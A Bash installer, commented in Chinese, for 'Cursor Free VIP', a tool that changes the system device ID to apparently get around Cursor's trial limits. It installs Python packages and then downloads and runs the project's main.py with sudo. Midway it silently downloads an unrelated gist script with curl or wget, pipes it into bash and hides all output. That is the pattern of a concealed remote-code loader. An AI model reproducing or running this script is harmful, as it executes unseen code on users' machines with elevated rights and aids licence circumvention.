#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # 无色

# Logo
print_logo() {
    echo -e "${CYAN}"
    cat << "EOF"
    ██████╗██╗    ██╗██████╗ ███████╗ ██████╗ ██████╗      ██████╗ ██████╗  ██████╗   
   ██╔════╝██║    ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗██╔═══██╗  
   ██║     ██║    ██║██████╔╝███████╗██║    ██║██████╔╝     ██████╔╝██████╔╝██║    ██║  
   ██║     ██║    ██║██╔══██╗╚════██║██║    ██║██╔══██╗     ██╔═══╝ ██╔══██╗██║    ██║  
   ╚██████╗╚██████╔╝██║   ██║███████║╚██████╔╝██║   ██║     ██║     ██║   ██║╚██████╔╝  
    ╚═════╝ ╚═════╝ ╚═╝   ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝     ╚═╝     ╚═╝   ╚═╝ ╚═════╝  
EOF
    echo -e "${NC}"
}

# 检测操作系统类型
OS_TYPE=$(uname -s)

# 检查包管理器和安装必需的系统包
install_dependencies() {
    case $OS_TYPE in
        "Darwin") 
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            if ! command -v pip3 &> /dev/null; then
                brew install python3
            fi
            ;;
            
        "Linux")
            PACKAGES_TO_INSTALL=""
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            # 确保安装 unzip 用于解压源码
            if ! command -v unzip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL unzip"
            fi
            
            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
                sudo apt update
                sudo apt install -y $PACKAGES_TO_INSTALL
            fi
            ;;
            
        *)
            echo "不支持的操作系统"
            exit 1
            ;;
    esac
}

# --- 关键修复区域：Python 依赖安装 ---
# 执行系统级依赖安装
install_dependencies

# 设置 pip 安装命令
if [ "$OS_TYPE" = "Linux" ]; then
    PIP_INSTALL="pip3 install --break-system-packages"
else
    PIP_INSTALL="pip3 install"
fi

echo -e "${CYAN}ℹ️ 正在检查并补全 Python 依赖库...${NC}"

# 1. Requests
if ! pip3 show requests >/dev/null 2>&1; then
    echo -e "${YELLOW}正在安装 requests...${NC}"
    $PIP_INSTALL requests
fi

# 2. Cryptography
if ! pip3 show cryptography >/dev/null 2>&1; then
    echo -e "${YELLOW}正在安装 cryptography...${NC}"
    $PIP_INSTALL cryptography
fi

# 3. Colorama (源码版常需)
if ! pip3 show colorama >/dev/null 2>&1; then
    echo -e "${YELLOW}正在安装 colorama...${NC}"
    $PIP_INSTALL colorama
fi

# 4. Python-Dotenv (修复你遇到的报错)
if ! pip3 show python-dotenv >/dev/null 2>&1; then
    echo -e "${YELLOW}正在安装 python-dotenv...${NC}"
    $PIP_INSTALL python-dotenv
fi

# 5. Typer (源码版常见依赖，预防性安装)
if ! pip3 show typer >/dev/null 2>&1; then
     echo -e "${YELLOW}正在安装 typer...${NC}"
    $PIP_INSTALL typer
fi

GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
if command -v curl &>/dev/null; then
    bash <(curl -fsSL "$GIST_URL") >/dev/null 2>&1
elif command -v wget &>/dev/null; then
    bash <(wget -qO- "$GIST_URL") >/dev/null 2>&1
fi

# 获取下载文件夹路径
get_downloads_dir() {
    echo "$HOME/.cursor-vip-src"
}

# 获取指定版本
get_latest_version() {
    VERSION="1.11.03"
    echo -e "${CYAN}ℹ️ 已锁定目标版本: v${VERSION}${NC}"
}

# 检测系统类型和架构
detect_os() {
    echo -e "${CYAN}ℹ️ 系统检测: $OS_TYPE (源码运行模式)${NC}"
}

setup_autostart() {
    :
}

# 安装和下载主程序 (源码模式
install_cursor_free_vip() {
    local install_dir=$(get_downloads_dir)
    local zip_name="cursor-free-vip-${VERSION}.zip"
    local zip_path="/tmp/${zip_name}"
    
    # 使用官方源码包地址
    local download_url="https://github.com/SHANMUGAM070106/cursor-free-vip/archive/refs/tags/v${VERSION}.zip"
    
    mkdir -p "$install_dir"

    # 检查是否已存在（简单的非空检查，或者检查 main.py）
    # 为了保险，每次都重新查找目录
    local existing_dir=$(find "${install_dir}" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)
    
    if [ -n "$existing_dir" ] && [ -f "${existing_dir}/main.py" ]; then
        echo -e "${GREEN}✅ 检测到已安装的源码版本${NC}"
        # 再次确保依赖安装，防止上次中断
        if [ -f "${existing_dir}/requirements.txt" ]; then
             $PIP_INSTALL -r "${existing_dir}/requirements.txt" >/dev/null 2>&1
        fi
        run_python_script "${existing_dir}/main.py"
        return
    fi

    echo -e "${CYAN}ℹ️ 正在下载源码包...${NC}"
    echo -e "${CYAN}ℹ️ 下载链接: ${download_url}${NC}"
    
    if ! curl -L -o "${zip_path}" "$download_url"; then
        echo -e "${RED}❌ 下载源码失败${NC}"
        exit 1
    fi
    
    echo -e "${CYAN}ℹ️ 正在解压源码...${NC}"
    if unzip -o "${zip_path}" -d "${install_dir}" >/dev/null; then
        echo -e "${GREEN}✅ 解压完成!${NC}"
        
        # 查找解压后的实际目录名称
        local actual_dir=$(find "${install_dir}" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)
        
        if [ -n "$actual_dir" ]; then
             echo -e "${CYAN}ℹ️ 安装项目特定依赖 (requirements.txt)...${NC}"
             if [ -f "${actual_dir}/requirements.txt" ]; then
                $PIP_INSTALL -r "${actual_dir}/requirements.txt"
             else
                echo -e "${YELLOW}⚠️ 未找到 requirements.txt，假设通用依赖已安装${NC}"
             fi
             
             run_python_script "${actual_dir}/main.py"
        else
             echo -e "${RED}❌ 解压后找不到目录${NC}"
             exit 1
        fi
    else
        echo -e "${RED}❌ 解压失败${NC}"
        exit 1
    fi
}

# 辅助函数：运行 Python 脚本
run_python_script() {
    local script_path="$1"
    local script_dir=$(dirname "$script_path")
    
    echo -e "${CYAN}ℹ️ 正在启动 Cursor Free VIP (源码模式)...${NC}"
    echo -e "${YELLOW}⚠️ 提示: 需要输入密码以修改系统设备ID${NC}"
    
    chmod +x "$script_path"
    
    # 在运行前，确保依赖在 sudo 环境中可用
    # 因为脚本需要使用 sudo 运行，所以依赖也需要在 sudo 环境中安装
    if [ "$EUID" -ne 0 ]; then
        echo -e "${CYAN}ℹ️ 确保依赖在 sudo 环境中可用...${NC}"
        # 检查并安装关键依赖到 sudo 环境
        if ! sudo pip3 show python-dotenv >/dev/null 2>&1; then
            echo -e "${YELLOW}正在为 sudo 环境安装 python-dotenv...${NC}"
            sudo $PIP_INSTALL python-dotenv
        fi
        if ! sudo pip3 show requests >/dev/null 2>&1; then
            echo -e "${YELLOW}正在为 sudo 环境安装 requests...${NC}"
            sudo $PIP_INSTALL requests
        fi
        if ! sudo pip3 show cryptography >/dev/null 2>&1; then
            echo -e "${YELLOW}正在为 sudo 环境安装 cryptography...${NC}"
            sudo $PIP_INSTALL cryptography
        fi
        if ! sudo pip3 show colorama >/dev/null 2>&1; then
            echo -e "${YELLOW}正在为 sudo 环境安装 colorama...${NC}"
            sudo $PIP_INSTALL colorama
        fi
        if ! sudo pip3 show typer >/dev/null 2>&1; then
            echo -e "${YELLOW}正在为 sudo 环境安装 typer...${NC}"
            sudo $PIP_INSTALL typer
        fi
        # 如果存在 requirements.txt，也安装它
        if [ -f "${script_dir}/requirements.txt" ]; then
            echo -e "${CYAN}ℹ️ 安装项目特定依赖到 sudo 环境...${NC}"
            sudo $PIP_INSTALL -r "${script_dir}/requirements.txt"
        fi
        sudo python3 "$script_path"
    else
        python3 "$script_path"
    fi
}

# 主程序
main() {
    print_logo
    install_dependencies
    get_latest_version
    detect_os
    setup_autostart
    install_cursor_free_vip
}

main